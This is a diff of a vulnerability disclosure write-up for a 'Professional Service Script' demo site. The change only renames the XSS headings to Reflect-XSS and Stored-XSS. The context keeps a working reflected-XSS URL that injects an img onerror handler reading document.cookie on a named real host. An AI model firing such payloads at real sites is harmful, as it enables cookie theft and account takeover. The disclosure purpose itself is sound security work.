@@ -1,11 +1,11 @@
-### Professional Service Script- the lastest version - SQL Injection/XSS[2]/Arbitrary-Binding/CSRF/Sensitive-Data-Leak[2]
+### Professional Service Script- the lastest version - SQL Injection/Stored-XSS/Reflect-XSS/Arbitrary-Binding/CSRF/Sensitive-Data-Leak[2]
 
 Well,  when I pentest the official demo site of Readymade Video Sharing Script, I found some vulnerabilities here.
 
 
 #### XSS:
 
-##### XSS1
+##### Reflect-XSS
 
 ```
 http://ordermanagementscript.com/demo/professional-service/admin/bannerview.php?view=27%27%22%3E666%3Cimg%20src=x%20onerror=console.log(document.cookie)%3E666%3C%27%22
@@ -14,7 +14,7 @@ http://ordermanagementscript.com/demo/professional-service/admin/bannerview.php?
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Professional-Service-Script/xss2.png)
 
 
-##### XSS2
+##### Stored-XSS
 
 
 ```
